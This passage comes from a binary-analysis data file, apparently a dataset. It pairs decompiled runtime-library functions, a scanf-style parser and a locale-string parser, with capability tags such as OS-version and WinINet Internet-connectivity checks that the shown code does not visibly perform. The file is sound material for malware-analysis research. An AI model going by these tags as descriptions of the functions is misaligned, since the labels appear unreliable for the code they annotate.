1;\n        uVar14 = fcn.0041f344();\n        *(unaff_EBP + -0x194) = uVar14;\n        uVar13 = *puVar21;\n        *(unaff_EBP + 0xc) = puVar21 + 1;\n        if (uVar13 != uVar14) goto code_r0x00420056;\n        if ((*(*0x44dcc0 + 1 + (uVar14 & 0xff) * 2) & 0x80) != 0) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar11 = fcn.0041f344();\n            uVar13 = puVar21[1];\n            *(unaff_EBP + 0xc) = puVar21 + 2;\n            if (uVar13 != uVar11) {\n                if (uVar11 != 0xffffffff) {\n                    fcn.004232b3(uVar11, *(unaff_EBP + 8));\n                }\n                goto code_r0x00420056;\n            }\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        }\n        goto code_r0x00420070;\n    }\n    iVar7 = 0;\n    *(unaff_EBP + -0x1a0) = 0;\n    *(unaff_EBP + -0x198) = 0;\n    *(unaff_EBP + -0x19c) = 0;\n    *(unaff_EBP + -0x1b4) = 0;\n    *(unaff_EBP + -0x18c) = 0;\n    *(unaff_EBP + -0x1a1) = 0;\n    *(unaff_EBP + -0x197) = 0;\n    *(unaff_EBP + -0x18e) = 0;\n    *(unaff_EBP + -0x17d) = 0;\n    *(unaff_EBP + -0x196) = 0;\n    *(unaff_EBP + -0x185) = 0;\n    *(unaff_EBP + -0x18d) = 1;\n    *(unaff_EBP + -0x1c8) = 0;\n    do {\n        puVar16 = puVar21 + 1;\n        uVar14 = *puVar16;\n        iVar8 = fcn.004214e0(uVar14);\n        puVar17 = puVar16;\n        if (iVar8 == 0) {\n            if (uVar14 < 0x4f) {\n                if (uVar14 != 0x4e) {\n                    if (uVar14 == 0x2a) {\n                        *(unaff_EBP + -0x18e) = *(unaff_EBP + -0x18e) + '\\x01';\n                    }\n                    else if (uVar14 != 0x46) {\n                        if (uVar14 == 0x49) {\n                            uVar13 = puVar21[2];\n                            if ((uVar13 == 0x36) && (puVar21[3] == 0x34)) {\n                                *(unaff_EBP + -0x1c8) = *(unaff_EBP + -0x1c8) + 1;\n                                *(unaff_EBP + -0x1ac) = 0;\n                                *(unaff_EBP + -0x1a8) = 0;\n                                puVar17 = puVar21 + 3;\n                            }\n                            else if (((uVar13 != 0x33) || (puVar17 = puVar21 + 3,  *puVar17 != 0x32)) &&\n                                    ((((puVar17 = puVar16,  uVar13 != 100 && (uVar13 != 0x69)) && (uVar13 != 0x6f)) &&\n                                     ((uVar13 != 0x78 && (uVar13 != 0x58)))))) goto code_r0x0041f524;\n                        }\n                        else if (uVar14 == 0x4c) {\n                            *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                        }\n                        else {\ncode_r0x0041f524:\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                            puVar17 = puVar16;\n                        }\n                    }\n                }\n            }\n            else if (uVar14 == 0x68) {\n                *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + -1;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + -1;\n            }\n            else {\n                if (uVar14 == 0x6c) {\n                    *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                }\n                else if (uVar14 != 0x77) goto code_r0x0041f524;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + '\\x01';\n            }\n        }\n        else {\n            *(unaff_EBP + -0x1b4) = *(unaff_EBP + -0x1b4) + 1;\n            iVar7 = (uVar14 - 0x30) + iVar7 * 10;\n        }\n        puVar21 = puVar17;\n    } while (*(unaff_EBP + -0x17d) == '\\0');\n    *(unaff_EBP + -0x18c) = iVar7;\n    *(unaff_EBP + 0xc) = puVar17;\n    if (*(unaff_EBP + -0x18e) == '\\0') {\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1dc) = puVar15;\n        *(unaff_EBP + 0x10) = puVar15 + 1;\n        puVar15 = *puVar15;\n        *(unaff_EBP + -0x1b0) = puVar15;\n    }\n    else {\n        puVar15 = *(unaff_EBP + -0x1b0);\n    }\n    *(unaff_EBP + -0x17d) = 0;\n    if ((*(unaff_EBP + -0x185) == '\\0') &&\n       ((uVar13 = *puVar17,  uVar13 == 0x53 || (*(unaff_EBP + -0x185) = 0xff,  uVar13 == 0x43)))) {\n        *(unaff_EBP + -0x185) = 1;\n    }\n    uVar14 = *puVar17 | 0x20;\n    *(unaff_EBP + -0x1c0) = uVar14;\n    if (uVar14 == 0x6e) {\ncode_r0x0041f5f1:\n        uVar9 = *(unaff_EBP + 8);\n    }\n    else {\n        if ((uVar14 != 99) && (uVar14 != 0x7b)) {\n            do {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar9 = fcn.0041f344();\n                iVar7 = fcn.00421559(uVar9);\n            } while (iVar7 != 0);\n            *(unaff_EBP + -0x194) = uVar9;\n            goto code_r0x0041f5f1;\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar9 = *(unaff_EBP + 8);\n        uVar10 = fcn.0041f344();\n        *(unaff_EBP + -0x194) = uVar10;\n    }\n    iVar7 = *(unaff_EBP + -0x1b4);\n    if ((iVar7 != 0) && (*(unaff_EBP + -0x18c) == 0)) {\ncode_r0x0041f901:\n        uVar14 = *(unaff_EBP + -0x194);\ncode_r0x00420056:\n        if (uVar14 != 0xffffffff) {\n            fcn.004232b3(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n        }\n        goto code_r0x0042008f;\n    }\n    if (0x6f < uVar14) {\n        if (uVar14 == 0x70) {\n            *(unaff_EBP + -0x18d) = 1;\ncode_r0x0041fcee:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\n            }\n            else if (uVar11 != 0x2b) goto code_r0x0041fd31;\n            piVar1 = unaff_EBP + -0x18c;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (iVar7 != 0)) {\n                *(unaff_EBP + -0x17d) = 1;\n            }\n            else {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.0041f344();\ncode_r0x0041fd2b:\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n        }\n        else {\n            if (uVar14 == 0x73) {\ncode_r0x0041f8b4:\n                if ('\\0' < *(unaff_EBP + -0x185)) {\n                    *(unaff_EBP + -0x196) = 1;\n                }\ncode_r0x0041fa7e:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                puVar20 = puVar15;\n                if (*(unaff_EBP + -0x194) != -1) {\n                    fcn.004232b3(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n                }\n                do {\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (iVar7 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar7 == 0)\n                       ) goto code_r0x0041fc9f;\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.0041f344();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if (uVar11 == 0xffffffff) goto code_r0x0041fc89;\n                    uVar13 = uVar11;\n                    if ((uVar14 != 99) && (((uVar14 != 0x73 || ((8 < uVar11 && (uVar11 < 0xe)))) || (uVar11 == 0x20))))\n                    {\n                        if ((uVar14 != 0x7b) ||\n                           (((*((uVar11 >> 3) + *(unaff_EBP + -0x1bc)) ^ *(unaff_EBP + -0x1a1)) & 1 << (uVar13 & 7)) ==\n                            0)) goto code_r0x0041fc89;\n                        uVar14 = *(unaff_EBP + -0x1c0);\n                    }\n                    if (*(unaff_EBP + -0x18e) == '\\0') {\n                        if (*(unaff_EBP + -0x196) == '\\0') {\n                            *puVar15 = uVar13;\n                            puVar15 = puVar15 + 1;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1c4) = uVar13;\n                            if ((*(*0x44dcc0 + 1 + (uVar11 & 0xff) * 2) & 0x80) != 0) {\n                                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                                uVar6 = fcn.0041f344();\n                                *(unaff_EBP + -0x1c3) = uVar6;\n                            }\n                            fcn.00423424(unaff_EBP + -0x1cc, unaff_EBP + -0x1c4, *0x44dd40);\n                            *puVar15 = *(unaff_EBP + -0x1cc);\n                            puVar15 = puVar15 + 2;\n                        }\n                        *(unaff_EBP + -0x1b0) = puVar15;\n                    }\n                    else {\n                        puVar20 = puVar20 + 1;\n                    }\n                } while( true );\n            }\n            if (uVar14 == 0x75) goto code_r0x0041fcee;\n            if (uVar14 != 0x78) {\n                if (uVar14 == 0x7b) {\n                    if ('\\0' < *(unaff_EBP + -0x185)) {\n                        *(unaff_EBP + -0x196) = 1;\n                    }\n                    iVar7 = *(unaff_EBP + 0xc);\n                    puVar21 = iVar7 + 1;\n                    *(unaff_EBP + 0xc) = puVar21;\n                    *(unaff_EBP + -0x1d0) = puVar21;\n                    if (*puVar21 == 0x5e) {\n                        puVar21 = iVar7 + 2;\n                        *(unaff_EBP + -0x1d0) = puVar21;\n                        *(unaff_EBP + -0x1a1) = 0xff;\n                    }\n                    puVar15 = *(unaff_EBP + -0x1bc);\n                    if (*(unaff_EBP + -0x1bc) == NULL) {\n                        *(unaff_EBP + -4) = 0;\n                        fcn.00418b80();\n                        *(unaff_EBP + -0x18) = &fcn.0041f35a::var_4h_2;\n                        *(unaff_EBP + -0x1bc) = &fcn.0041f35a::var_4h_2;\n                        *(unaff_EBP + -4) = 0xffffffff;\n                        puVar15 = &fcn.0041f35a::var_4h_2;\n                    }\n                    fcn.004192e0(puVar15, 0, 0x20);\n                    if (*(unaff_EBP + -0x1c0) != 0x7b) goto code_r0x0041fa52;\n                    if (*puVar21 != 0x5d) goto code_r0x0041fa52;\n                    uVar13 = 0x5d;\n                    puVar21 = puVar21 + 1;\n                    *(puVar15 + 0xb) = 0x20;\n                    while (uVar12 = *puVar21,  uVar12 != 0x5d) {\n                        if (((uVar12 == 0x2d) && (uVar13 != 0)) && (uVar3 = puVar21[1],  uVar3 != 0x5d)) {\n                            puVar21 = puVar21 + 2;\n                            uVar12 = uVar3;\n                            if (uVar13 < uVar3) {\n                                uVar12 = uVar13;\n                                uVar13 = uVar3;\n                            }\n                            if (uVar12 <= uVar13) {\n                                uVar14 = uVar12;\n                                *(unaff_EBP + -0x1d4) = (uVar13 - uVar12) + 1;\n                                do {\n                                    *(puVar15 + (uVar14 >> 3)) = *(puVar15 + (uVar14 >> 3)) | '\\x01' << (uVar14 & 7);\n                                    uVar14 = uVar14 + 1;\n                                    piVar1 = unaff_EBP + -0x1d4;\n                                    *piVar1 = *piVar1 + -1;\n                                } while (*piVar1 != 0);\n                            }\n                            uVar13 = 0;\n                        }\n                        else {\n                            *(unaff_EBP + -0x198) = uVar12;\n                            *(puVar15 + (uVar12 >> 3)) = *(puVar15 + (uVar12 >> 3)) | '\\x01' << (uVar12 & 7);\n                            puVar21 = puVar21 + 1;\ncode_r0x0041fa52:\n                            uVar13 = *(unaff_EBP + -0x198);\n                        }\n                    }\n                    puVar15 = *(unaff_EBP + -0x1b0);\n                    if (*(unaff_EBP + -0x1c0) == 0x7b) {\n                        *(unaff_EBP + 0xc) = puVar21;\n                    }\n                    uVar14 = *(unaff_EBP + -0x1c0);\n                    goto code_r0x0041fa7e;\n                }\n                goto code_r0x0041f8f3;\n            }\ncode_r0x0041f67b:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\ncode_r0x0041fba1:\n                piVar1 = unaff_EBP + -0x18c;\n                *piVar1 = *piVar1 + -1;\n                if ((*piVar1 == 0) && (iVar7 != 0)) {\n                    *(unaff_EBP + -0x17d) = 1;\n                }\n                else {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.0041f344();\n                    *(unaff_EBP + -0x194) = uVar11;\n                }\n            }\n            else if (uVar11 == 0x2b) goto code_r0x0041fba1;\n            if (uVar11 == 0x30) {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.0041f344();\n                *(unaff_EBP + -0x194) = uVar11;\n                if ((uVar11 == 'x') || (uVar11 == 'X')) {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.0041f344();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (*(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -2,  *(unaff_EBP + -0x18c) < 1)) {\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    uVar14 = 0x78;\n                }\n                else {\n                    *(unaff_EBP + -0x19c) = 1;\n                    if (uVar14 == 0x78) {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.004232b3(uVar11, uVar9);\n                        }\n                        uVar11 = 0x30;\n                        goto code_r0x0041fd2b;\n                    }\n                    if (*(unaff_EBP + -0x1b4) != 0) {\n                        piVar1 = unaff_EBP + -0x18c;\n                        *piVar1 = *piVar1 + -1;\n                        if (*piVar1 == 0) {\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                        }\n                    }\n                    uVar14 = 0x6f;\n                }\n            }\n        }\ncode_r0x0041fd31:\n        if (*(unaff_EBP + -0x1c8) == 0) {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.0042151a(uVar11);\n                        if (iVar7 != 0) {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 4;\n                            iVar7 = fcn.004214e0(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x0041ff0e;\n                        }\ncode_r0x0041ff08:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.004214e0(uVar11);\n                        if (iVar7 == 0) goto code_r0x0041ff08;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x0041ff08;\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 3;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) * 10;\n                        }\n                    }\ncode_r0x0041ff0e:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + -0x30 + uVar11;\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x0041ff6c;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.0041f344();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.004232b3(uVar11, uVar9);\n                        }\n                    }\ncode_r0x0041ff6c:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                *(unaff_EBP + -0x1a0) = -*(unaff_EBP + -0x1a0);\n            }\n        }\n        else {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.0042151a(uVar11);\n                        if (iVar7 != 0) {\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 4;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 4 | uVar4 >> 0x1c;\n                            iVar7 = fcn.004214e0(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x0041fdf9;\n                        }\ncode_r0x0041fdf3:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.004214e0(uVar11);\n                        if (iVar7 == 0) goto code_r0x0041fdf3;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x0041fdf3;\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 3;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 3 | uVar4 >> 0x1d;\n                        }\n                        else {\n                            var_4h_2 = *(unaff_EBP + -0x1ac);\n                            uVar22 = fcn.0041a840();\n                            *(unaff_EBP + -0x1ac) = uVar22;\n                            *(unaff_EBP + -0x1a8) = uVar22 >> 0x20;\n                        }\n                    }\ncode_r0x0041fdf9:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        uVar4 = uVar11 - 0x30;\n                        puVar2 = unaff_EBP + -0x1ac;\n                        uVar5 = *puVar2;\n                        *puVar2 = *puVar2 + uVar4;\n                        *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) + (uVar4 >> 0x1f) + CARRY4(uVar5, uVar4);\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x0041fe57;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.0041f344();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.004232b3(uVar11, uVar9);\n                        }\n                    }\ncode_r0x0041fe57:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                iVar7 = *(unaff_EBP + -0x1ac);\n                *(unaff_EBP + -0x1ac) = -iVar7;\n                *(unaff_EBP + -0x1a8) = -(*(unaff_EBP + -0x1a8) + (iVar7 != 0));\n            }\n        }\n        if (uVar14 == 0x46) {\n            *(unaff_EBP + -0x19c) = 0;\n        }\n        if (*(unaff_EBP + -0x19c) != 0) {\n            if (*(unaff_EBP + -0x18e) == '\\0') {\n                *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n                puVar15 = *(unaff_EBP + -0x1b0);\n                uVar9 = *(unaff_EBP + -0x1a0);\ncode_r0x0041ffc2:\n                if (*(unaff_EBP + -0x1c8) == 0) {\n                    if (*(unaff_EBP + -0x18d) == '\\0') {\n                        *puVar15 = uVar9;\n                    }\n                    else {\n                        *puVar15 = uVar9;\n                    }\n                }\n                else {\n                    *puVar15 = *(unaff_EBP + -0x1ac);\n                    puVar15[1] = *(unaff_EBP + -0x1a8);\n                }\n            }\n            goto code_r0x0041ffee;\n        }\n        goto code_r0x0042008f;\n    }\n    if (uVar14 == 0x6f) goto code_r0x0041fcee;\n    if (uVar14 == 99) {\n        if (iVar7 == 0) {\n            *(unaff_EBP + -0x1b4) = 1;\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 1;\n        }\n        goto code_r0x0041f8b4;\n    }\n    if (uVar14 == 100) goto code_r0x0041fcee;\n    if (uVar14 < 0x65) {\ncode_r0x0041f8f3:\n        if (**(unaff_EBP + 0xc) != *(unaff_EBP + -0x194)) goto code_r0x0041f901;\n        *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + -1;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + 0x10) = *(unaff_EBP + -0x1dc);\n        }\n    }\n    else {\n        if (0x67 < uVar14) {\n            if (uVar14 == 0x69) {\n                uVar14 = 100;\n                goto code_r0x0041f67b;\n            }\n            if (uVar14 != 0x6e) goto code_r0x0041f8f3;\n            uVar9 = *(unaff_EBP + -0x184);\n            if (*(unaff_EBP + -0x18e) != '\\0') goto code_r0x0041ffee;\n            goto code_r0x0041ffc2;\n        }\n        pcVar18 = unaff_EBP + -0x17c;\n        iVar7 = *(unaff_EBP + -0x194);\n        if (iVar7 == 0x2d) {\n            *(unaff_EBP + -0x17c) = 0x2d;\n            pcVar18 = unaff_EBP + -0x17b;\ncode_r0x0041f6ba:\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar9 = *(unaff_EBP + 8);\n            iVar7 = fcn.0041f344();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        else {\n            if (iVar7 == 0x2b) goto code_r0x0041f6ba;\n            uVar9 = *(unaff_EBP + 8);\n        }\n        if ((*(unaff_EBP + -0x1b4) == 0) || (0x15d < *(unaff_EBP + -0x18c))) {\n            *(unaff_EBP + -0x18c) = 0x15d;\n        }\n        while( true ) {\n            iVar8 = fcn.004214e0(iVar7);\n            if ((iVar8 == 0) ||\n               (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0)) break;\n            *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n            *pcVar18 = iVar7;\n            pcVar18 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0041f344();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        if ((*0x44dd44 == iVar7) &&\n           (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0041f344();\n            *pcVar18 = *0x44dd44;\n            while( true ) {\n                pcVar18 = pcVar18 + 1;\n                *(unaff_EBP + -0x194) = iVar7;\n                iVar8 = fcn.004214e0(iVar7);\n                if ((iVar8 == 0) ||\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0))\n                break;\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar18 = iVar7;\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.0041f344();\n            }\n        }\n        pcVar19 = pcVar18;\n        if ((*(unaff_EBP + -0x19c) != 0) &&\n           (((iVar7 == 0x65 || (iVar7 == 0x45)) &&\n            (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)))) {\n            *pcVar18 = 'e';\n            pcVar19 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.0041f344();\n            *(unaff_EBP + -0x194) = iVar7;\n            if (iVar7 == 0x2d) {\n                *pcVar19 = '-';\n                pcVar19 = pcVar18 + 2;\ncode_r0x0041f7f4:\n                iVar8 = *(unaff_EBP + -0x18c);\n                *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n                if (iVar8 != 0) goto code_r0x0041f825;\n                *(unaff_EBP + -0x18c) = 0;\n            }\n            else if (iVar7 == 0x2b) goto code_r0x0041f7f4;\n            while ((iVar8 = fcn.004214e0(iVar7),  iVar8 != 0 &&\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0))) {\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar19 = iVar7;\n                pcVar19 = pcVar19 + 1;\ncode_r0x0041f825:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.0041f344();\n                *(unaff_EBP + -0x194) = iVar7;\n            }\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        if (iVar7 != -1) {\n            fcn.004232b3(iVar7, uVar9);\n        }\n        if (*(unaff_EBP + -0x19c) == 0) goto code_r0x0042008f;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n            *pcVar19 = '\\0';\n            (**0x44d968)(*(unaff_EBP + -0x18d) + -1, *(unaff_EBP + -0x1b0), unaff_EBP + -0x17c);\n        }\n    }\ncode_r0x0041ffee:\n    *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + '\\x01';\n    *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\ncode_r0x00420070:\n    if ((*(unaff_EBP + -0x194) == -1) && ((**(unaff_EBP + 0xc) != '%' || ((*(unaff_EBP + 0xc))[1] != 'n'))))\n    goto code_r0x0042008f;\n    goto code_r0x0041f39d;\ncode_r0x0041fc89:\n    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n    if (uVar11 != 0xffffffff) {\n        fcn.004232b3(uVar11, *(unaff_EBP + 8));\n    }\ncode_r0x0041fc9f:\n    if (puVar20 == puVar15) goto code_r0x0042008f;\n    if ((*(unaff_EBP + -0x18e) == '\\0') &&\n       (*(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1,  *(unaff_EBP + -0x1c0) != 99)) {\n        if (*(unaff_EBP + -0x196) == '\\0') {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n        else {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n    }\n    goto code_r0x0041ffee;\n}\n",
        "token_count": 10136
    },
    "004204e6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004204e6(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    int32_t iVar3;\n    \n    arg_8h_00 = arg_ch;\n    fcn.004192e0(arg_8h, 0, 0x90);\n    if (*arg_ch != '\\0') {\n        if ((*arg_ch != '.') || (arg_ch[1] == '\\0')) {\n            arg_ch = NULL;\n            do {\n                uVar2 = fcn.00421420(arg_8h_00, 0x442498);\n                if (uVar2 == 0) {\n                    return 0xffffffff;\n                }\n                cVar1 = arg_8h_00[uVar2];\n                if (arg_ch == NULL) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h;\n                    if (cVar1 == '.') {\n                        return 0xffffffff;\n                    }\n                }\n                else if (arg_ch == 0x1) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if (cVar1 == '_') {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x40;\n                }\n                else {\n                    if (arg_ch != 0x2) {\n                        return 0xffffffff;\n                    }\n                    if (0xf < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if ((cVar1 != '\\0') && (cVar1 != ',')) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x80;\n                }\n                fcn.00421eb0(iVar3, arg_8h_00, uVar2);\n                if ((cVar1 == ',') || (cVar1 == '\\0')) {\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n                arg_8h_00 = arg_8h_00 + uVar2 + 1;\n            } while( true );\n        }\n        fcn.00421eb0(arg_8h + 0x80, arg_ch + 1, 0xf);\n        *(arg_8h + 0x8f) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 538
    },
    "004205c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004205c2(uint param_1, int32_t param_2)\n\n{\n    fcn.004200e0(param_1, param_2);\n    if (*(param_2 + 0x40) != '\\0') {\n        fcn.004204c2(param_1, 2, 0x4424a0, param_2 + 0x40);\n    }\n    if (*(param_2 + 0x80) != '\\0') {\n        fcn.004204c2(param_1, 2, 0x44249c, param_2 + 0x80);\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "0042070a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
